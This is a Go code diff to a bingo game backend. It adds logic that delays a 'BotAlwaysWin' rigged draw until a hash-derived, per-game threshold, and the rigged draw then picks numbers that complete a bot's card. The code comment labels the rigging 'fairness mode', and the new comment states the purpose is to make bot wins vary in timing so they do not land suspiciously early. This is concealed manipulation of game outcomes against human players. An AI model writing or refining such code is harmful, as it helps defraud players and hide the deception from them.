@@ -1096,13 +1096,48 @@ func (uc *GameUseCase) collectWinners(ctx context.Context, gameID uuid.UUID, dra
 	return allWinners, nil
 }
 
+const (
+	botBiasMediumDrawMin = 18
+	botBiasMediumDrawMax = 29
+	botBiasLateDrawMin   = 30
+	botBiasLateDrawMax   = 41
+	botBiasLongDrawMin   = 42
+	botBiasLongDrawMax   = 54
+)
+
+func shouldUseBotBiasedDraw(gameID uuid.UUID, drawnCount int) bool {
+	return drawnCount >= botBiasStartDrawCount(gameID)
+}
+
+func botBiasStartDrawCount(gameID uuid.UUID) int {
+	seed := uint32(2166136261)
+	for _, b := range gameID {
+		seed ^= uint32(b)
+		seed *= 16777619
+	}
+
+	bucket := seed % 10
+	if bucket < 6 {
+		return botBiasMediumDrawMin + int((seed>>8)%uint32(botBiasMediumDrawMax-botBiasMediumDrawMin+1))
+	}
+	if bucket < 9 {
+		return botBiasLateDrawMin + int((seed>>8)%uint32(botBiasLateDrawMax-botBiasLateDrawMin+1))
+	}
+	return botBiasLongDrawMin + int((seed>>8)%uint32(botBiasLongDrawMax-botBiasLongDrawMin+1))
+}
+
 // biasedDraw checks whether fairness mode is enabled and, when it is, replaces
-// the random next number with one that completes a bingo on any active bot
-// card. If no such number exists, it falls back to the original random draw.
-// A nil or false config, or any read error, disables bias for this tick only.
+// the random next number with one that completes a bingo on any active bot card.
+// The bias starts only after a per-game draw threshold, so bot wins vary between
+// medium, late, and long rounds instead of always landing as soon as possible.
+// If no such number exists, it falls back to the original random draw. A nil or
+// false config, or any read error, disables bias for this tick only.
 func (uc *GameUseCase) biasedDraw(ctx context.Context, gameID uuid.UUID, drawnNumbers []int) (string, int, error) {
 	cfg, err := uc.botRepo.GetConfig(ctx)
 	if err != nil || !cfg.BotAlwaysWin {
+		return "", 0, nil
+	}
+	if !shouldUseBotBiasedDraw(gameID, len(drawnNumbers)) {
 		return "", 0, nil
 	}
 
